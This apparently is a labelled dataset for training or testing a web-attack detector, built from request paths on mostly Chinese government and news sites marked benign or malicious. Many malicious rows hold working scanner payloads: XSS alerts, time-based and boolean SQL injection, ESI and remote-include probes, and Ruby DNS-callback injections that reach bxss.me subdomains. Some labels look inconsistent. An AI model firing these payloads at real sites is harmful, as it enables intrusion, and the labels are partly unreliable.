request	label
/****/js/chunk-3d4dca20.1eec99fd.js	0
/******/public/2021/11/17/110438.images/v110438_b1637115813795.jpg	0
/*******/sys_config.php	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u987a\u8bda\u6c7d\u8f66\u670d\u52a1\u90e8	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u4e30\u6da6\u7ee9\u7164\u4e1a\u8fd0\u9500\u6709\u9650\u516c\u53f8	0
/****/tznn9o-article-e108724244.html	0
/****/b-e655402.html	0
/***/003/003/550/00300355006_50a2ecf8.jpg	0
/*******/202009/202009091141051072.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u4e2a\u4f53\u7ecf\u8425\u7965\u4e91\u7802\u9505\u5c45	0
/****/qzfwj/list_54.html	0
/***/resource/js/lib/jquery-1.11.1.min.js	0
/****/system/2021/04/07/013364543.shtml	0
/****/system/2021/08/22/javascript:window.close();	1
/****/20211117/10755.html	0
/****/xqldly/hfbysj/202003/t20200306_148884.html	0
/*****/system/2020/08/04/javascript:void();	1
/******/system/2011/09/29/010483083.shtml	0
/******/jslib/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/urite.min.js	1
/******/system/2007/12/25/002310511.shtml	0
/**/ourbusiness/projectcontracting/201412/w020150512310540875515.jpg	0
"/**/' 'a'.concat(70-3).concat(22*4).concat(122).concat(73).concat(113).concat(73) (require'socket'
socket.gethostbyname('hitai' 'zspucccoeed0c.bxss.me.')[3].to_s) '/widgets/hanweb/ie6fixed/ie6fixed.js"	1
/***********/ztjd/2016/9/201609290939124996.xls	0
/**/ui/widgets/scrollup/http://bxss.me/t/fit.txt/themes/image.css	1
/**********/system/2021/12/17/013495627.shtml	0
/******/ew/20161024140307272.jpg	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u7ea2\u5d16\u5b50\u4e61\u7ea2\u745e\u6751\u4fe1\u65fa\u5546\u5e97	0
/****/20211108/10706.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u60c5\u7f18\u676d\u5e2e\u8336\u9910\u5385	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u559c\u5fb7\u6765\u5bb6\u5177\u4e13\u5356\u5e97	0
"/*****/phpliteadmin_v1-1/phpliteadmin.php?table=""""/>alert(777)"	1
/zwxx_11337/****/201606/t20160627_312331.html	0
/****/tzgg/201508/t20150825_319326.html	0
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u5355\u6c11\u82cf\u98ce\u5947\u767e\u8d27\u95e8\u5e02\u90e8	0
/**********/system/2020/07/27/013214200.shtml	0
/****/bmkx/ygjt/201707/t20170705_92390_wap.html	0
/******/resource/code/datainput.jsp?owner=1329914701&e=1&w=1920&h=1080&treeid=1022&refer=ahr0cdovl3d3dy5uegpzy3guy29tlmnul3h6enguahrt&pagename=l2luzm8uannw&newsid=1221	0
/****/bmkx/swjw/202001/t20200125_146868.html	0
/***/blockdata/getsearchinfo.do?&title=\u6842\u4e91	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u80dc\u5229\u4fee\u710a\u90e8	0
/*******/qiye/b-e1476556.html	0
/****/国际展望大会（杭州2018）	1
/****/web/search?channelid=222832&searchword=\u7518\u8083\u5927\u4e1c\u65b9\u5efa\u8bbe\u5de5\u7a0b\u6709\u9650\u516c\u53f8\u5b81\u590f\u529e\u4e8b\u5904	0
/****/zzxxgk/bmjyj/xxgkml/ybjhygq/202108/t20210817_185770.html	0
/****/gjcp/lyjx/kjcx/kycg/kjjl/bqsm/	0
/****/202010/t20201016_2257764.html	0
/****/zxta/201911/t20191128_1865888.html	0
/__local/*/65/9c/ddd8eacb087d6d28d25d8a41e22_840cbdaf_1c9af.jpg	0
/***/mobile_h5/waparticledetail.do?article_id=202104231647301259&contenttype=article	0
/******/css_scy_xl.css	1
/****/jtdt/jt17_6388/201706/w020170616527034112349.jpg	0
"/****/http://bxss.me/t/xss.html?	1
/****/images/p020160823427747943988.jpg	0
/******/public/2021/12/08/20211208_17d97a73b5d_r1_600k.mp4	0
/*****/gy48/cpgyss.asp?key=gpl&l=\ufffd\u0ea3	0
/****/zt/msss/msxw/201812/t20181206_1196576.html	0
/*****/system/2018/07/06/012649657_04.shtml	0
"/************/template'""""()&%<acx><script >dsxv(9777)</script>/jcse/110105008056111/16/images/plugin/waterpull/pinterest_grid.js"	1
"/****/xxgknb/2014/list.html?new=0.963632956696624<esi:include src=""""http://bxss.me/rpb.png""""/>"	1
/****/zzxxgk/zrzyj/zfxxgkml_2139/ghjh_1969/list.html?new=0.3783697432583706	0
/zwxx_11337/****/202003/t20200325_2001399.html	0
/*****/gy48/ljcpgyview.asp?id=42879500&l=\ufffd\u03fa\ufffd	0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u5f20\u6ce2\u6ee9\u7f8a\u8089\u7ecf\u9500\u5e97	0
/*******/qiye/b-e1896069.html	0
/******/system/2018/01/24/javascript:window.close();	1
/****/zt/msss/msxw/202003/t20200319_1995715.html	0
/***/0/01/75/28/1752886_984095.png	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u8001\u674e\u54e5\u9999\u8fa3\u574a	0
/*******/main/admin/configure_extensions.php?display=</script><script>confirm(777)</script>	1
/**/userrole/modal_sendmail.aspx?from=user&usernamecollection=anony' and ('anony' 'secsiteserverinj' @@version)>0 and '1'='1	1
/****/system/2018/08/22/javascript:window.close();	1
"/******/select'""""()&%<acx><script >eggf(9944)</script>.css"	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u8001\u53f6\u94a3\u91d1\u55b7\u6f06\u90e8	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5934\u53f7\u73a9\u5bb6\u7535\u7ade\u9986\u65b0\u534e\u8857\u5e97	0
/**********/system/2013/06/09/011106720.shtml	1
/*****/index.cfm?fuseaction=clogin.main&returnurl=&status=sendlogin&email=alert(777)	1
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u9686\u6e56\u798f\u7965\u5bb6\u5ead\u519c\u573a	0
/**********/system/2020/05/27/013171544.shtml	0
/**********/system/2021/10/10/013461985.shtml	0
/*****/quotationresultnew/queryquotationresult.z	0
/*****/gy42/ljcpgyview.asp?id=29630056&l2=\u03ab\ufffd\ufffd&l=\u027d\ufffd\ufffd	0
/****/xxgkml/rsrm/201610/t20161026_66273_wap.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u9c7f\u9999\u56de\u5473\u5c0f\u5403\u5e97	0
/*******/qiye/b-e2232189.html	0
/xwdt'||'/****/jzgl/gzdt/1.htm	1
/zwxx_11337/****/201906/t20190628_1574060.html	0
/***/blockdata/articlelist_4g3.do?channelarticlelist_4g3_channelid_ss=channelid&channelid=shangye¤tpage=18&query=java	0
"/"""".gethostbyname(lc(""""hitsy"""".""""nasvizhb7cd30.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(116).chr(65).chr(104).chr(71).""""/******/tjj/zfxxgkml_2127/xwfbh_2065/list.html"	1
/****/wdsjs/hfswsj/202006/t20200603_167299_wap.html	0
"/****/dependencies/index?search="""">alert(/777/)"	1
/**/mediacenter/news/202108/t20210820_314719.html	0
/************/static/contract/pdf_sign_extra.js?6.0.8.398	0
/*****/b-e1110450.html	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u5973\u738b\u6d0b\u88c5\u5e97	0
"/******/web/jpage/theme/simple/"""" """"a"""".concat(70-3).concat(22*4).concat(112).concat(80).concat(103).concat(82) (require""""socket""""
socket.gethostbyname(""""hitsy"""" """"qvriqziq40c44.bxss.me."""")[3].to_s) """"/jpage.css"	1
/****/b-e785179.html	0
/zwxx_11337/****/202104/t20210408_2703040_zzb.html	0
/****/xsvip.php	1
/****/zdlygk/bzxajgc/szss/plx'||'.htm	1
/****/gjmt/' and 'x'='y	1
/**********/system/2021/11/29/013487603.shtml	0
/*****/system/2020/09/06/013241374.shtml	0
/**/css/mp.php	1
/****/system/2021/10/20/013467475.shtml	0
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u82ad\u59ae\u978b\u5e97	0
/****************/file/loadimage/?id=46888a8a-e564-4ca3-afda-414a3eb3efb8&dt=2021-12-20_10:25:59	0
/****/bmkx/snmj/201803/t20180302_100679.html	0
/****/tzgg/201907/*	0
/*****/gy42/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd35crmo&l2=\u0422\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/****/bwcx/dtbb/jtdt/201911/w020191121568249684027.jpg	0
/****/zfwjn/1088/1094/list.html?new=if(now()=sysdate(),sleep(3),0)	1
/*******/modules.php	1
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u5c0f\u52c9\u670d\u88c5\u4e13\u67dc	0
/**************/cms/blockdata/sharelog.do	0
/***/weixin/getconf?url=https:/xhn-wap.hinews.cn/news_details.html?language_type=0&from=androidapp&id=1264978&userid=mzc0odq4z&version=3.6.0	0
/****/zzxxgk/wsjkwyh/gzdt_3599/xxdt/202105/t20210506_181346.html	0
/****/web/search?channelid=222832&searchword=\u65b0\u7586\u897f\u57df\u6052\u901a\u7535\u529b\u8bbe\u8ba1\u6709\u9650\u516c\u53f8\u5b81\u590f\u5206\u516c\u53f8	0
/******/system/2017/12/19/javascript:window.print()	1
/****/zgsdt/2020_qydt/202011/t20201123_256262.html	0
/****/dllsj_new/	1
/**/system/2021/12/19/012231729.shtml	0
/****/system/2020/04/03/013131495.shtml	0
/*******/zwgk/czgk/bmyjs/zzqfyxt/gyszjfy/	0
/*******/taglib/jiujiao.php	1
/***********/shichangzixun/caiwuyaowen/	1
/zwxx_11337/****/202111/t20211124_3147310_zzb.html	0
/****/qzfwj/202111/t20211129_3170632.html?from=singlemessage	0
/************/investment-advisory' and 2*3*8=6*8 and 'bjhn'='bjhn/	1
/**********/system/2020/03/27/013126613.shtml	0
/*******/201907/201907111629351106.html	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u6361\u4e2a\u8f66\u6c7d\u8f66\u9500\u552e\u670d\u52a1\u6709\u9650\u516c\u53f8	0
/***/0/00/25/26/252658_122912.jpg	0
"/****/system/2021/09/07/013446963'""/><	1
/**********/system/2021/11/08/013477060.shtml	0
/*****/javascript:stranbody();	1
/****/czgk/bmjs/zzqdwgzbmyxsjg/zzqjjw/201908/t20190808_1655024.html	0
/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/*********/newssearchdwr.js	1
/****/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqjgswglj	0
/*******/837842.html	0
/*****/index/lists/cate_id/156.html?page=1	0
/zwxx_11337/****/201904/w020190425320052631554.jpg	0
"/*****/openemr/?site="""">alert(777);"	1
"/**/ui/lib/easyui/'""""()&%<acx><script >vrou(9562)</script>/bootstrap/linkbutton.css"	1
/****/zt/2017jgnb/xjzf/201802/p020180207442334818851.pdf	0
/****/web/search?channelid=222832&searchword=\u6cfe\u6e90\u53bf\u5e76\u5143\u7164\u70ad\u9500\u552e\u90e8	0
/******/457/http://bxss.me/t/fit.txt?.superslide.2.1.js	1
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(4727)"">?_=1630312117892"	1
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u5353\u8bd7\u5c3c\u670d\u9970\u77f3\u5634\u5c71\u4e07\u8fbe\u5e97	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u56de\u65cf\u81ea\u6cbb\u533a\u755c\u4ea7\u516c\u53f8\u88d8\u76ae\u95e8\u5e02\u90e8	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u5f20\u83b9\u7535\u5b50\u4ea7\u54c1\u7ecf\u9500\u90e8	0
/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/*******/fdzdgknr/ysjs/1.htm	1
"/******/452/' 'a'.concat(70-3).concat(22*4).concat(120).concat(78).concat(104).concat(83) (require'socket'
socket.gethostbyname('hitkc' 'lmpdmvhn9295c.bxss.me.')[3].to_s) '.css"	1
/**********/qhwh/javascript:void();	1
"/****/category/fengxianjingshi?*/-->'""""></iframe></script></style></title></textarea><script >alert(02055)</script>=1"	1
/********/environment/wx_authorize?code=073q2xml2cigl84u1cll24hbi04q2xmb&state=61c01d59baae4603456834&appid=wx4705810e91036e74	0
/**********/system/2020/08/17/013227987.shtml	0
/******/usercenter/index?qrcode=41215	0
/*****/20200924/8715.html	0
"/*/210607/index/d5bd64e8e58af018c57671623349a002'""""()&%<acx><script >la0c(9234)</script>.css"	1
/****/xxgkml/zfczyjs/http://bxss.me/t/fit.txt.html	1
/zwxx_11337/****/201708/t20170822_455655.html	0
/***/com/login.asp?logintype=xm' and 6852=6852 and 'pgeu'='pgeu	1
/*****/index_dmqh_yp.html	0
/zwxx_11337/****/index_19.html	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u51e1\u51e1\u5316\u5986\u54c1\u5e97	0
/**********/2021-03-020'xor(if(now()=sysdate(),sleep(3),0))xor'z.html	1
/****/system/2021/12/18/javascript:window.close();	1
/******/system/2021/11/28/013486917.shtml	0
/**********/system/2020/06/10/013182178.shtml	0
/****/czgk/bmyjs/zzqdwyzfpcjgyzsjgyzssydw/zzqgdzt/	0
/**********/system/2021/05/18/013386872.shtml	0
/****/b-e263398.html	0
/****/gwyxx/15.htm	1
/**********/system/2021/12/18/013496383.shtml	0
"/**/dsp_editcreative.cfm?attributes.siteid="""">alert(777)"	1
"/*/170822-'""""()&%<acx><script >rcwk(9465)</script>/index/06defa41f3b0c6ebc8da65f95d7f2f20.css"	1
/****/czgk/bmjs/qtdw/zzqzfgjjglb/	0
/zwxx_11337/****/index.html	0
/****/zgsdt/2021_qydt/202109/t20210903_315554.html	0
/****/system/2013/08/07/011152341.shtml	0
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(462)"">?_=1630311416553"	1
/***/webinterface/function/?command=getxmllisting&format=jsonobj&path=%<script>alert(777)</script>&random=0.3300707341372783	1
/*******/201912/201912081018501009.html	0
/******/this.attr('action')||window.location.tostring(),type:this.attr('method')||'get'},options||{});var	1
/******/n236753/n236776/c1649498/content'||'.html	1
/******/resource/pdfjs/build/aqebivhywfhywfhywfhywfhywfhywfhywfhywfhywfhywfhyaaabaqaadwacaqeee/t3/index.jsp	1
/****/20211021/10613.html	0
/****/xxczh1/ywdt/if(now()=sysdate(),sleep(12),0).htm	1
/****/zgsdt/2021_qydt/202111/t20211110_320302.html	0
/***********/zaojianpinglun/?_=1640035733334	0
"/***/getdetail?vno=3.5.0&data={""news_id"":""1263543"",""diversion_id"":"""",""sign"":""""}"	0
/****/zxxx/content.html?metadataid=10062444	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtigaragk4imcwvb/fwunitq=&openid=ovl7jjggvfacshhkfs2nprdt2svm&outer_str=quicklyrq,3,17394,15242&activate_ticket=fdzv9emqaffrnr3xboqhb2j oavpcgdcu2f2wurapajoo8dbj5 fzedtzplsmcartcbkdjnftpbe1nhqbtysiwezl472ivn1qsvntefyrs4=	0
/******/sjd	0
/****/system/2021/11/27/javascript:window.print()	1
/***/0/00/13/28/132884_610631.gif	0
/******/_content/download.jsp?urltype=news.downloadattachurl%' or 9567=3889 and '%'='&owner=1707212448&wbfileid=51419	1
/****/zfxxgk1%' and 2*3*8=6*8 and 'aazd'!='aazd%/zfxxgkzd/1.htm	1
/****/qzfwj/201801/t20180115_669499.html/index_1.html	0
/****/20211216/javascript:void(0);	1
/*****/system/more/443000000000000/0007/443000000000000_00000723.shtml	0
/****/qzfwj/5619/5631/index_1.html	0
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u9707\u6e56\u4e61\u9e3f\u8fd0\u9910\u5385	0
/****/kjdt/202112/t20211201_322584.html	0
/zwxx_11337/****/202002/t20200203_1939619.html	0
/*****/wd-demo/index.php?c=prompt(777)	1
"/***/col3862/index.html/""""><script>alert(2035)</script>"	1
/*/public/viewclick/?classid=200&id=1300&addclick=1	0
/****/frontcontroller?domainname=<script>alert(77729</script>&operation=160	1
/****/xqdt/hnx/201610/t20161025_51226.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u9ad8\u8273\u6885\u9c9c\u8089\u5e97	0
"/"""" """"a"""".concat(70-3).concat(22*4).concat(97).concat(73).concat(97).concat(70) (require""""socket""""
socket.gethostbyname(""""hitsh"""" """"bdftxmcwe1135.bxss.me."""")[3].to_s) """"/********/jcse/110105008056111/16/images/jquery.cookie.js"	1
"/****/zzxxgk/tjj/zfxxgkml_2127/jgzn_2042/list.html?new="""" """"a"""".concat(70-3).concat(22*4).concat(97).concat(90).concat(105).concat(66) (require""""socket""""
socket.gethostbyname(""""hitye"""" """"wyvevotj374d0.bxss.me."""")[3].to_s) """""	1
/****/zycwxx/202011/t20201113_255857.html	1
/***/0/01/72/26/1722604_933407.png	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u65b0\u533a\u751f\u519b\u79cd\u5b50\u519c\u836f\u5e97	0
/****/gfxwj/5620/5650/index.html	0
/script%' and 2*3*8=6*8 and '9kuy'!='9kuy%/*/1905151614057782.js	1
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u4e01\u5e73\u751f\u997c\u5b50\u5e97	0
"/************/"""" """"a"""".concat(70-3).concat(22*4).concat(105).concat(90).concat(98).concat(81) (require""""socket""""
socket.gethostbyname(""""hitbm"""" """"semskrfj91aee.bxss.me."""")[3].to_s) """"/jcse/110105008056111/16/images/searchbtn.js"	1
/******/scy_gj_sylwwxj_tubanner4.jpg	0
"/cgi-bin/****/""><script>alert(777)</script>show/title/time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c"	1
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5ba3\u548c\u9547\u6c38\u4e45\u5316\u80a5\u7ecf\u9500\u90e8	0
/****/system/2021/11/18/javascript:window.print()	1
/****/netflow/jspui/j_security_check?radiususerenabled=false&authrule_name=authenticator&j_username=admin52f43'><script>alert(777)</script>6f472a19875&j_password=admin	1
"/*/action/showinfo/?classid='""""()&%<acx><script >6dg8(9706)</script>&id=10307"	1
/****/xxgkml/qtfdxx/zcjd/qwjd/202110/t20211012_195232.html	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5b87\u51e1\u661f\u4fe1\u606f\u54a8\u8be2\u6709\u9650\u516c\u53f8	0
/****/gccb/xnygc/201411/w020141125586169880061.jpg	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u91d1\u5927\u6d77\u5efa\u7b51\u88c5\u9970\u5de5\u7a0b\u6709\u9650\u516c\u53f8	0
/****/xqdt/hnx/201610/w020161025738523394803.jpg	0
/**********/system/2020/10/16/013265252.shtml	0
/**********/system/2021/12/17/013495554.shtml	0
/****/xxgknb/2018/bmnb2018/201903/w020190306323762423146.jpg	0
/****/fkxxfy/202108/t20210816_185757.html	0
/***/003/004/502/00300450211_dfbd19a1.jpg	0
/****/rwfc/202104/t20210402_272195.html	0
/***/blockdata/getsearchinfo.do?&title=\u4e0a\u5e1d\u4e4b\u624b	0
/****/jtdt/2020_jtyw/202008/t20200825_252446.html	0
/****/tzgg/2010tzgg/201412/t20141218_40478.html	0
"/********/hero_os/search?q="""" onmouseover=alert(777) ="""""	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a6\u53f7\u516c\u5bd3\u5bbe\u9986	0
/***/weixin/getconf?url=https:/xhn-wap.hinews.cn/news_details.html?from=androidapp&id=1258835&version=3.6.0	0
/**********/system/2021/12/09/013491946.shtml	0
"/' 'a'.concat(70-3).concat(22*4).concat(114).concat(75).concat(113).concat(85) (require'socket'
socket.gethostbyname('hituk' 'kxyujtdg27d62.bxss.me.')[3].to_s) '/****/bmjs/gdyx/"	1
/zwxx_11337/****/201912/t20191223_1900707.html	0
/*******/201906031636535513	0
/****/20201123/e110927301.html	0
/***/blockdata/getsearchinfo.do?&title=\u5904\u5bf9\u8c61	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u795e\u675e\u4e2d\u836f\u6750\u6709\u9650\u516c\u53f8	0
/****/bmkx/sybj/201911/t20191121_144579.html	0
"/**/mydevice/index.jsp?locale=""""><script>alert(777)</script>"	1
/zwxx_11337/****/201707/t20170710_312437.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u674e\u5609\u5546\u884c	0
/****/qyzdsx/201812/\u534e\u6da6\u6c34\u6ce5_files/crc_log2_cn.png	0
/***********/jinrongqihuo/if(now()=sysdate(),sleep(6),0)/index_9.html	1
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u91d1\u946b\u5de5\u4e1a\u5e9f\u6e23\u7ecf\u9500\u90e8	0
/*****/gy48/cpgyss.asp?key= \u02b3\u01b7\ufffd\ufffd\ufffd\ufffd\u05ac&l=\ufffd\ufffd\ufffd\ufffd	0
/****/zt/hjbhdc/201704/t20170418_319821.html	0
"/****/reviews/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="""">alert(/777/)&false_positives=without&sort=&asc=false&commit=search"	1
/******/system/2016/04/14/011981261.shtml	0
/****//xfs.bxss.me/202012/t20201225_2539623.html	1
/****/2020jnxc/yxzp/202006/w020200701492012419564.jpg	0
/**********/system/2020/05/27/013171875.shtml	0
/**********/system/2021/09/06/ data:image/svg xml,<svg viewbox=	1
/****/if(now()=sysdate(),sleep(12),0)/czjs/zcwj/1.htm	1
/****/qtgkxx/202110/t20211021_319306.html	0
"/******/jslib/ckplayer/ckplayer.js/""""><script>alert(744)</script>?_=1630311573652"	1
/****/rdhy/if(now()=sysdate(),sleep(12),0).htm	1
/**********/system/2021/09/01/013444457.shtml	0
/**********/system/2015/09/08/011814529.shtml	0
/**********/system/2021/12/15/013494697.shtml	0
/**********/system/2020/05/24/013169022.shtml	0
/**/system/2021/08/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/_vsl/********************************/0caf9db1/18db1/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
"/wp-content/*******/woocommerce/assets/js/zeroclipboard/zeroclipboard.swf?id=""))}catch(e){}if(!self.a)self.a=!prompt(document.domain)//&width&height"	1
/****/atutor/mods/_standard/calendar/getlanguage.php?token=calendar_next<script>alert(777)</script>&pub=1	1
/****/gccb/qgzfgc/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/******/visitcount/visit.jsp?i_columnid=34&i_webid=1&type=2' and 'x'='y	1
/**/system/2019/12/30/011887530.shtml	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u52a9\u8001	0
/*******/countdoc?siteid=115&docid=3133034	0
/***/1.shtml	0
/****/gjsjd/mtkgj/	0
/**/system/2020/12/11/javascript:void(0);	1
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5174\u4ec1\u9547\u601d\u6cca\u6e56\u725b\u8089\u9762\u9986	0
/**********/system/2020/06/18/013188163.shtml	0
/****************/notification/negotiate?access_token=ee9f1689-82b5-4878-938b-6ac214990a1b	0
"/images<esi:include src=""""http://*******/rpb.png""""/>/457/phone.js"	1
/if(now()=sysdate(),sleep(0),0)/****/	1
/**/images/inp_subm3.png	0
/******/n239584/n239608/n239616/index'||'.html	1
/****/xxgk/rsxcsx/gjcp/gjjtwzq/ywly/gccb/xnygc/kjcx/kycg/zscq/xwzx/zgsdt/images/gj2014_css.css	0
/****/lsgj	0
/**/system/2021/11/24/012224990.shtml	0
/*****/gy48/cpgyss.asp?key=\u6d4e\u5357\u9ed1\u677f\ufffd?&l=\ufffd\ufffd\ufffd\ufffd	0
"/***/0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z/12/15/art_31_223689.html"	1
/zwxx_11337/****/zzlist_2.html	0
/******/if(now()=sysdate(),sleep(12),0)/js/jquery/jquery-latest.min.js	1
"/****/byszf/sz/202108/t20210806_"""" """"a"""".concat(70-3).concat(22*4).concat(111).concat(65).concat(102).concat(73) (require""""socket""""
socket.gethostbyname(""""hitec"""" """"bqmeocsfe0913.bxss.me."""")[3].to_s) """".html"	1
